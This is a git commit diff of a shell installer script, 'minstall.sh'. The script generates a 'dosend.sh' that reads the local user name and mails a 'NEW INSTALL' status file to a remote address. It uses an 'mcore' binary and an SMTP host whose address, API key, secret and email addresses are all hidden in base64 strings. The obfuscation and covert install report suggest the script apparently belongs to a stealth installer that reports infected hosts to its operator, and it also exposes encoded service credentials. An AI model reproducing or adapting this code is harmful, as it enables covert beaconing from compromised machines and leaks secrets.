8b4aede812a2408691b16e8e6fad7556898a86e0
Jame <lungtungner@gmail.com>
2022-04-08 17:33:39 +0700

    Update minstall.sh

--- gitclone/minstall.sh
+++ gitclone/minstall.sh
@@ -8,7 +8,12 @@ echo "NEW INSTALL $Uname" > status.txt
 #base64 -d core.txt > mcore
 chmod +x smtp-cli
 
-tee -a emcf.sh <<EOF
+
+
+tee -a dosend.sh <<EOF
+#!/bin/bash
+Uname=$(ls /home)
+
 mhotpot=$(echo -n 'aW4tdjMubWFpbGpldC5jb206NTg3' | base64 --decode)
 mabi=$(echo -n 'YzY2ODA0YzA2YzY5ZjEzMzZiOTM4ZTEwNmUxZDUxZjA=' | base64 --decode)
 musec=$(echo -n 'YTMzNTdlNjVjMmNlODlkOTFlNTJmZTEzYzA2N2FlOWQ=' | base64 --decode)
@@ -16,13 +21,6 @@ mform=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
 mtors=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
 messtxt=status.txt
 #--verbose
-EOF
-chmod +x emcf.sh
-
-tee -a dosend.sh <<EOF
-#!/bin/bash
-Uname=$(ls /home)
-source emcf.sh
 
 ./mcore --missing-modules-ok \
 --host  $mhotpot \
